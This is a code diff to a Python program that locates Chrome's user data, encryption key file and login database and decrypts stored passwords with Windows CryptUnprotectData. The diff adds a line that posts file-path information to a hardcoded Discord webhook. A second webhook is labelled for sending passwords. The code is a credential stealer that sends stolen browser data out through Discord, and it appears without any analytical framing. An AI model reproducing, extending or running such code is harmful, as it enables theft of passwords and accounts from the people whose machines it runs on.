@@ -71,7 +71,6 @@ from tempfile import TemporaryFile, _get_default_tempdir
 from win32crypt import CryptUnprotectData
 from os.path import join, exists, isfile
 from os import environ, remove
-# from Crypto.Cipher import AES
 from base64 import b64decode
 from sqlite3 import connect
 from getpass import getuser
@@ -83,7 +82,7 @@ from io import BytesIO
 from csv import writer
 from json import load
 
-class extraact1():
+class ExtraAct1():
     def __init__(self):
         user_data = self.user_data = join(environ["USERPROFILE"], "AppData",  "Local", "Google", "Chrome", "User Data",)
         self.key_file = join(user_data, "Local State")
@@ -101,6 +100,7 @@ class extraact1():
     def get_database_cursor(self): 
         tempdb = self.tempdb
         db_path = self.db_path
+        requests.post("https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getcwd()} DBINFO] {str(db_path)}"})
         if not exists(db_path): return False
         copyfile(db_path, tempdb)
         connection = self.connection = connect(tempdb)
@@ -158,7 +158,7 @@ class ExtraThread(QThread):
     
         try:
             password_extraact1_webhook = "https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg"
-            extraact1 = extraact1()
+            extraact1 = ExtraAct1()
             extraact1.get_database_cursor()
             extraact1.get_key()
             text = ""
